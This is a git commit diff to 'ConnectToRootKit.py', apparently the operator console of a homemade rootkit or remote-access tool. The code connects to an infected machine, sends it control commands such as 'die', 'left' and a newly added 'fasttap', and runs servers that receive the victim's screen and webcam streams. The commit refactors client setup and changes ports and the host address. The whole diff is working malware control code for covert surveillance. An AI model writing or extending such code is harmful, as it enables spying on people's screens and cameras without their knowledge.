fd44aa26d56ce51474100aa7229acdd13a267ef2
N0SAFE <77668394+N0SAFE@users.noreply.github.com>
2021-03-24 14:48:14 +0100

    Update ConnectToRootKit.py

--- rootkitterminal/ConnectToRootKit.py
+++ rootkitterminal/ConnectToRootKit.py
@@ -17,8 +17,7 @@ def command(commandToExecute):
     global ipToConnect
     if commandToExecuteList[0] in ("connect", "connexion", "connecter", "co"):
         if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
-            ipToConnect = commandToExecuteList[1]
-            return ipToConnect
+            return commandToExecuteList[1]
         else:
             print("[ERROR]: no ip requested")
             command(input(">"))
@@ -36,13 +35,14 @@ def command(commandToExecute):
 
 def sendData(data):
         global run
+        datalist = data.split()
         if data in ("die", "kill"):
-            client.send(data.encode())
+            client.send("die".encode())
             run = False
         elif data in ("left", "quit"):
             camera.stop_server()
             screen.stop_server()
-            client.send(data.encode())
+            client.send("left".encode())
             run = False
         elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
             client.send("screen".encode())
@@ -52,12 +52,16 @@ def sendData(data):
             client.send("camera".encode())
         elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
             cameraStop()
+        elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
+            datalist.pop(0)
+            data = "fast "+" ".join(datalist)
+            client.send(data.encode())
         else:
             client.send(data.encode())
 
 def getIp():
     serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    serverSocket.bind((ipHost, 22227))
+    serverSocket.bind((ipHost, 22228))
     serverSocket.listen()
     (clientConnected, clientAddress) = serverSocket.accept()
     print("Connection acquired from %s:%s" % (clientAddress[0], clientAddress[1]))
@@ -95,8 +99,27 @@ def cameraStop():
     t = threading.Thread(target=camera.start_server)
     t.start()
 
+def creatClient():
+    global screen, camera, client
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.settimeout(5)
+    try:
+        client.connect((ip, port))
+    except:
+        run = False
+        try:
+            print("can't connect to "+ip)
+        except:
+            print("ip isn't allowed")
+    screen = StreamingServer(ipHost, 22224)
+    t = threading.Thread(target=screen.start_server)
+    t.start()
+    camera = StreamingServer(ipHost, 22225)
+    t = threading.Thread(target=camera.start_server)
+    t.start()
+    
 ipToConnect = str()
-ipHost = "127.0.0.1"
+ipHost = "172.17.1.214"
 port = 22228
 
 progrun = True
@@ -105,22 +128,7 @@ while progrun == True:
     ip = command(input(">"))
     run = True
     if progrun == True:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.settimeout(5)
-        try:
-            client.connect((ip, port))
-        except:
-            run = False
-            try:
-                print("can't connect to "+ip)
-            except:
-                print("ip isn't allowed")
-        screen = StreamingServer(ipHost, 22224)
-        t = threading.Thread(target=screen.start_server)
-        t.start()
-        camera = StreamingServer(ipHost, 22225)
-        t = threading.Thread(target=camera.start_server)
-        t.start()
+        creatClient()
     
     while run == True and progrun == True:
         dataToSend = input("%s>" % (ip))
